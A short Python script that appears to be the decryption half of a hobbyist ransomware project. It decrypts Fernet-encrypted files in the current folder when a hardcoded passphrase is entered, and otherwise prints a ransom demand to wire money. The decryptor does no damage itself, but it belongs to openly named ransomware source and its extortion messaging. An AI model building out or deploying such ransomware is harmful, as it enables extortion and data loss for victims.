#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Lets find some files
files = []

for file in os.listdir():
    if file == "randsomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "shutdownthemalware"

user_phrase = input("the only way to solve this is to enter the secretphrase:")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        try:
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print(f"Decrypted {file} successfully.")
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")
    print("You were lucky this time.")
else:
    print("You thought you would guess that? Better get that money wired up.")
